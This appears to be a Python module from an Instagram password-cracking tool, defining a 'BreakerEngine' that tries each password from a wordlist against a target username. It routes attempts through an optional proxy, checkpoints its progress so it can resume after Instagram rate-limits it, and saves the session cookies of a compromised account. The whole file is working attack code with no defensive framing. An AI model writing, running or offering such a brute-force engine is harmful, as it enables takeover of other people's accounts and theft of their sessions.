import asyncio
from typing import List, Callable, Awaitable
from rich.progress import Progress, TaskID
from ..network.client import AsyncInstagramClient
from ..core.session import SessionManager
from ..utils.display import display

class BreakerEngine:
    def __init__(self, target_username: str, wordlist: List[str], proxy: str | None = None):
        self.target_username = target_username
        self.wordlist = wordlist
        self.proxy = proxy
        self.found_password = None

    async def run(self, progress_callback: Callable[[int], None] = None, resume: bool = False):
        session_mgr = SessionManager(self.target_username)
        start_index = session_mgr.load_checkpoint(self.target_username) if resume else 0
        
        async with AsyncInstagramClient(proxy=self.proxy) as client:
            for i in range(start_index, len(self.wordlist)):
                password = self.wordlist[i]
                if self.found_password:
                    break
                
                try:
                    # display.log(f"Testing: {password}") # Removed for cleaner output with progress bar
                    response = await client.login_attempt(self.target_username, password)
                    
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("authenticated") is True:
                            self.found_password = password
                            session_mgr.save_session(client.client.cookies)
                            session_mgr.clear_checkpoint(self.target_username)
                            break
                        elif data.get("message") == "checkpoint_required" or "checkpoint_url" in data:
                            self.found_password = password
                            session_mgr.clear_checkpoint(self.target_username)
                            break
                    elif response.status_code == 400:
                        data = response.json()
                        if data.get("message") == "checkpoint_required":
                             self.found_password = password
                             session_mgr.clear_checkpoint(self.target_username)
                             break
                    elif response.status_code == 429:
                        display.warning(f"Rate limited at index {i}. Saving checkpoint and stopping...")
                        session_mgr.save_checkpoint(self.target_username, i)
                        return None # Exit engine
                    else:
                        # Failed attempt
                        pass
                except Exception as e:
                    display.error(f"Error testing {password}: {str(e)}")
                    session_mgr.save_checkpoint(self.target_username, i)
                
                if progress_callback:
                    progress_callback(1)
                
                # Periodically save checkpoint
                if i % 10 == 0:
                    session_mgr.save_checkpoint(self.target_username, i)
                
                # Small delay to avoid immediate rate limit
                await asyncio.sleep(1)

        return self.found_password
